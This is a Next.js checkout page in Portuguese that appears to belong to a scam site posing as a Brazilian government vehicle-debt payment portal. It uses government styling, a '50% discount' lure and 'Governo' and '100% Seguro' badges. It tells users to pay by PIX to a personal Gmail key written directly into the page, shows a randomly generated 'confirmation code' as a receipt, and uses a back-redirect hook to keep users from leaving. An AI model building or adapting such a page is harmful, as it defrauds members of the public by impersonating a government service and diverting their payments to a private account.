"use client"

import { useState, useEffect } from "react"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { SecurityBadge } from "@/components/security-badge"
import { useTracking } from "@/hooks/use-tracking"
import { useRouter } from "next/navigation"
import { BackRedirectProvider, useBackRedirect } from "@/components/back-redirect-provider"

function CheckoutPageContent() {
  const [pixData, setPixData] = useState<any>(null)
  const [userData, setUserData] = useState<any>(null)
  const [processandoPagamento, setProcessandoPagamento] = useState(false)
  const [pagamentoRealizado, setPagamentoRealizado] = useState(false)
  const [codigoPagamento, setCodigoPagamento] = useState("")
  const [qrCodeLoaded, setQrCodeLoaded] = useState(false)
  const [qrCodeUrl, setQrCodeUrl] = useState("")
  const { sessionId, trackingEnabled, trackEvent } = useTracking()
  const { showBackRedirect } = useBackRedirect()
  const router = useRouter()

  // Carrega dados do PIX do localStorage
  useEffect(() => {
    const savedPixData = localStorage.getItem("pixData")
    const savedUserData = localStorage.getItem("userData")

    if (!savedPixData || !savedUserData) {
      router.push("/debitos")
      return
    }

    try {
      const parsedPixData = JSON.parse(savedPixData)
      const parsedUserData = JSON.parse(savedUserData)

      // Verifica se os dados não são muito antigos (30 minutos)
      const thirtyMinutes = 30 * 60 * 1000
      if (Date.now() - parsedPixData.timestamp > thirtyMinutes) {
        localStorage.removeItem("pixData")
        router.push("/debitos")
        return
      }

      setPixData(parsedPixData)
      setUserData(parsedUserData)

      // Pré-carrega o QR Code imediatamente
      if (parsedPixData.pix?.qrCodeText) {
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(parsedPixData.pix.qrCodeText)}`
        setQrCodeUrl(qrUrl)

        // Pré-carrega a imagem
        const img = new Image()
        img.crossOrigin = "anonymous"
        img.onload = () => {
          setQrCodeLoaded(true)
        }
        img.onerror = () => {
          setQrCodeLoaded(true) // Mesmo com erro, para de mostrar loading
        }
        img.src = qrUrl
      }
    } catch (error) {
      console.error("Erro ao carregar dados do PIX:", error)
      router.push("/debitos")
    }
  }, [router])

  // Tracking de page view
  useEffect(() => {
    if (trackingEnabled && sessionId && pixData) {
      trackEvent("page_view", { step: 4, page: "checkout" }, 4)
    }
  }, [trackingEnabled, sessionId, pixData, trackEvent])

  const handleVoltar = () => {
    if (trackingEnabled && sessionId) {
      trackEvent("back_button_click", { current_step: 4 }, 4)
    }
    // Remove dados do PIX ao voltar
    localStorage.removeItem("pixData")
    // Mostra o back redirect em vez de navegar diretamente
    showBackRedirect(2)
  }

  const handleNovaConsulta = () => {
    if (trackingEnabled && sessionId) {
      trackEvent("new_search_click", { previous_step: 4 }, 4)
    }
    localStorage.removeItem("userData")
    localStorage.removeItem("pixData")
    router.push("/")
  }

  const confirmarPagamentoPix = async () => {
    if (!pixData?.id) return

    setProcessandoPagamento(true)

    // Polling para verificar o status do pagamento
    const checkPaymentStatus = async () => {
      try {
        const response = await fetch(`/api/payment/check-status?transactionId=${pixData.id}`)
        const result = await response.json()

        if (result.success) {
          if (result.transaction.status === "paid") {
            // Pagamento confirmado
            const codigo = gerarCodigoPagamento()
            setCodigoPagamento(codigo)
            setPagamentoRealizado(true)
            setProcessandoPagamento(false)
            return true
          } else if (result.transaction.status === "expired" || result.transaction.status === "cancelled") {
            // Pagamento expirado ou cancelado
            alert("PIX expirado ou cancelado")
            setProcessandoPagamento(false)
            return true
          }
        }
        return false
      } catch (error) {
        console.error("Erro ao verificar status:", error)
        return false
      }
    }

    // Simula verificação com polling
    const maxAttempts = 60 // 5 minutos (5 segundos * 60)
    let attempts = 0

    const pollStatus = async () => {
      const completed = await checkPaymentStatus()
      attempts++

      if (!completed && attempts < maxAttempts) {
        setTimeout(pollStatus, 5000) // Verifica a cada 5 segundos
      } else if (attempts >= maxAttempts) {
        alert("Tempo limite excedido. Verifique seu pagamento.")
        setProcessandoPagamento(false)
      }
    }

    // Inicia o polling após 5 segundos
    setTimeout(pollStatus, 5000)
  }

  // Gera um código de pagamento aleatório
  const gerarCodigoPagamento = () => {
    const caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    let codigo = ""
    for (let i = 0; i < 10; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length))
    }
    return codigo
  }

  // Calcula o valor com 50% de desconto
  const calcularTotalComDesconto = () => {
    if (!pixData?.amount) return "R$ 0,00"
    return pixData.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  if (!pixData || !userData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f8f8f8]">
        <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-[#1351B4]"></div>
      </div>
    )
  }

  if (pagamentoRealizado) {
    return (
      <main className="min-h-screen flex flex-col bg-[#f8f8f8]">
        <Header />
        <div className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
          <div className="bg-white p-6 rounded-sm border-2 border-[#06A73C] shadow-sm">
            <div className="text-center mb-6">
              <div className="bg-[#06A73C] rounded-full p-4 w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-8 w-8 text-white"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h1 className="text-2xl font-bold text-[#071D41] mb-2">Pagamento Realizado com Sucesso!</h1>
              <p className="text-[#555555]">Seu pagamento foi processado e confirmado.</p>
            </div>

            <div className="bg-[#F8F8F8] p-4 border border-gray-200 rounded-sm mb-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <p className="text-xs text-[#555555]">Código de Confirmação</p>
                  <p className="font-bold text-[#071D41] text-lg">{codigoPagamento}</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Valor Pago</p>
                  <p className="font-medium text-[#071D41]">{calcularTotalComDesconto()}</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Data e Hora</p>
                  <p className="font-medium text-[#071D41]">{new Date().toLocaleString("pt-BR")}</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">ID da Transação</p>
                  <p className="font-medium text-[#071D41]">{pixData.id}</p>
                </div>
              </div>
            </div>

            <div className="flex space-x-4">
              <button
                type="button"
                onClick={handleNovaConsulta}
                className="flex-1 bg-[#1351B4] text-white py-3 px-6 rounded-sm hover:bg-[#0D47A1] focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:ring-offset-2 transition-colors font-medium"
              >
                Nova Consulta
              </button>
            </div>
          </div>
        </div>
        <Footer />
      </main>
    )
  }

  return (
    <main className="min-h-screen flex flex-col bg-[#f8f8f8]">
      <Header />
      <div className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
        <div className="bg-white p-6 rounded-sm border border-gray-200 shadow-sm">
          <div className="border-b border-gray-200 pb-4 mb-6">
            <h1 className="text-2xl font-bold text-[#071D41]">Pagamento via PIX</h1>
            <div className="flex text-sm text-[#555555] mt-1 space-x-4">
              <div>Checkout Seguro</div>
              <div>PIX Gerado Automaticamente</div>
            </div>
          </div>

          {/* Indicador de progresso */}
          <div className="mb-8">
            <div className="flex items-center justify-between">
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">✓</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Identificação</div>
              </div>
              <div className="flex-1 mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">✓</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Veículo</div>
              </div>
              <div className="flex-1 mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">✓</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Débitos</div>
              </div>
              <div className="flex-1 mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-10 w-10 flex items-center justify-center bg-[#1351B4] text-white">4</div>
                <div className="mt-2 text-sm text-[#071D41] font-medium">Pagamento</div>
              </div>
            </div>
          </div>

          <div className="max-w-md mx-auto">
            {/* Desktop: Mostra informações da chave PIX */}
            <div className="hidden md:block text-center mb-6">
              <div className="bg-white p-6 border-2 border-[#1351B4] rounded-lg mb-4 shadow-sm">
                <div className="text-center mb-4">
                  <div className="bg-[#1351B4] rounded-full p-4 w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-8 w-8 text-white"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M3 8l7.89 4.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
                      />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-[#071D41] mb-2">Chave PIX via E-mail</h3>
                  <div className="bg-[#F0F5FF] border border-[#1351B4]/20 rounded-lg p-4 mb-4">
                    <p className="text-sm text-[#555555] mb-2">Chave PIX:</p>
                    <p className="font-mono text-lg font-bold text-[#1351B4] break-all">alannaalmeida30@gmail.com</p>
                  </div>
                  <p className="text-sm text-[#555555]">
                    Use esta chave PIX no seu aplicativo bancário para realizar o pagamento
                  </p>
                </div>
              </div>
            </div>

            {/* Mobile: Layout Simplificado com chave PIX */}
            <div className="block md:hidden mb-6">
              {/* Valor em destaque no topo */}
              <div className="bg-gradient-to-r from-[#1351B4] to-[#0D47A1] text-white p-6 rounded-xl mb-4 text-center shadow-lg">
                <div className="text-sm opacity-90 mb-1">Valor a pagar</div>
                <div className="text-3xl font-bold mb-2">{calcularTotalComDesconto()}</div>
                <div className="bg-white/20 rounded-full px-3 py-1 text-sm inline-block">⏱️ Válido por 30 minutos</div>
              </div>

              {/* Botão de Copiar PIX - NO TOPO */}
              <div className="bg-white border-2 border-[#1351B4] rounded-xl p-6 mb-6 shadow-lg">
                <div className="text-center mb-4">
                  <div className="bg-[#1351B4] rounded-full p-3 w-12 h-12 mx-auto mb-3 flex items-center justify-center">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-6 w-6 text-white"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M3 8l7.89 4.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
                      />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-[#071D41] mb-3">Chave PIX via E-mail</h3>
                </div>

                <div className="bg-[#F0F5FF] border border-[#1351B4]/20 rounded-lg p-4 mb-4">
                  <p className="text-sm text-[#555555] mb-2 text-center">Use esta chave PIX:</p>
                  <div className="bg-white border-2 border-[#1351B4] rounded-lg p-3 text-center">
                    <p className="font-mono text-base font-bold text-[#1351B4] break-all">alannaalmeida30@gmail.com</p>
                  </div>
                </div>

                <button
                  type="button"
                  className="w-full bg-[#06A73C] hover:bg-[#058F33] text-white p-4 rounded-lg transition-all duration-200 shadow-md"
                  onClick={(event) => {
                    navigator.clipboard.writeText("alannaalmeida30@gmail.com")
                    const button = event.target.closest("button")
                    const originalContent = button.innerHTML
                    button.innerHTML = `
                      <div class="flex items-center justify-center">
                        <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                        <span class="font-bold">COPIADO!</span>
                      </div>
                    `
                    setTimeout(() => {
                      button.innerHTML = originalContent
                    }, 2000)
                  }}
                >
                  <div className="flex items-center justify-center">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-5 w-5 mr-2"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
                      />
                    </svg>
                    <span className="font-bold">COPIAR CHAVE PIX</span>
                  </div>
                </button>
              </div>

              <div className="bg-[#F0F5FF] border-2 border-[#1351B4]/20 rounded-xl p-6 mb-6">
                <h3 className="text-lg font-bold text-[#071D41] mb-4 text-center">🏦 Como pagar</h3>
                <div className="space-y-3">
                  <div className="flex items-center bg-white p-3 rounded-lg shadow-sm">
                    <div className="bg-[#1351B4] text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      1
                    </div>
                    <span className="text-[#333333] font-medium">Copie a chave PIX acima</span>
                  </div>
                  <div className="flex items-center bg-white p-3 rounded-lg shadow-sm">
                    <div className="bg-[#1351B4] text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      2
                    </div>
                    <span className="text-[#333333] font-medium">Abra seu app do banco</span>
                  </div>
                  <div className="flex items-center bg-white p-3 rounded-lg shadow-sm">
                    <div className="bg-[#1351B4] text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      3
                    </div>
                    <span className="text-[#333333] font-medium">Vá em PIX → Chave PIX</span>
                  </div>
                  <div className="flex items-center bg-white p-3 rounded-lg shadow-sm">
                    <div className="bg-[#1351B4] text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      4
                    </div>
                    <span className="text-[#333333] font-medium">Cole a chave e digite o valor</span>
                  </div>
                  <div className="flex items-center bg-white p-3 rounded-lg shadow-sm">
                    <div className="bg-[#06A73C] text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      ✓
                    </div>
                    <span className="text-[#333333] font-medium">Confirme o pagamento</span>
                  </div>
                </div>
              </div>

              {/* Informações Extras */}
              <div className="bg-white border border-gray-200 rounded-xl p-4 mb-6">
                <div className="grid grid-cols-2 gap-4 text-center">
                  <div>
                    <div className="text-2xl mb-1">🔒</div>
                    <div className="text-xs text-[#555555]">100% Seguro</div>
                  </div>
                  <div>
                    <div className="text-2xl mb-1">⚡</div>
                    <div className="text-xs text-[#555555]">Instantâneo</div>
                  </div>
                  <div>
                    <div className="text-2xl mb-1">💰</div>
                    <div className="text-xs text-[#555555]">50% Desconto</div>
                  </div>
                  <div>
                    <div className="text-2xl mb-1">🏛️</div>
                    <div className="text-xs text-[#555555]">Governo</div>
                  </div>
                </div>
              </div>
            </div>

            {/* Informações do Pagamento - Desktop */}
            <div className="hidden md:block bg-[#F8F8F8] p-4 border border-gray-200 rounded-lg mb-6">
              <h3 className="text-sm font-bold text-[#071D41] mb-3">Informações do Pagamento</h3>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <p className="text-xs text-[#555555]">Valor a Pagar</p>
                  <p className="font-bold text-[#071D41] text-lg">{calcularTotalComDesconto()}</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Desconto</p>
                  <p className="font-bold text-[#06A73C] text-lg">50%</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Chave PIX</p>
                  <p className="font-mono text-xs text-[#1351B4] break-all">alannaalmeida30@gmail.com</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Tipo</p>
                  <p className="font-medium text-[#333333] text-sm">E-mail</p>
                </div>
              </div>
            </div>

            {/* Botões de ação */}
            <div className="flex space-x-4">
              <button
                type="button"
                onClick={handleVoltar}
                className="flex-1 bg-[#EDEDED] text-[#071D41] py-4 px-6 rounded-lg hover:bg-[#DDDDDD] focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-2 transition-colors font-medium"
              >
                Voltar
              </button>

              <button
                type="button"
                onClick={confirmarPagamentoPix}
                disabled={processandoPagamento || !qrCodeLoaded}
                className="flex-1 bg-[#06A73C] text-white py-4 px-6 rounded-lg hover:bg-[#058F33] focus:outline-none focus:ring-2 focus:ring-[#06A73C] focus:ring-offset-2 transition-colors font-medium disabled:opacity-50 flex items-center justify-center"
              >
                {processandoPagamento ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    Verificando...
                  </>
                ) : !qrCodeLoaded ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    Preparando...
                  </>
                ) : (
                  <>
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-5 w-5 mr-2"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                    Confirmar Pagamento
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        <div className="mt-6">
          <SecurityBadge />
        </div>
      </div>
      <Footer />
    </main>
  )
}

export default function CheckoutPage() {
  return (
    <BackRedirectProvider>
      <CheckoutPageContent />
    </BackRedirectProvider>
  )
}
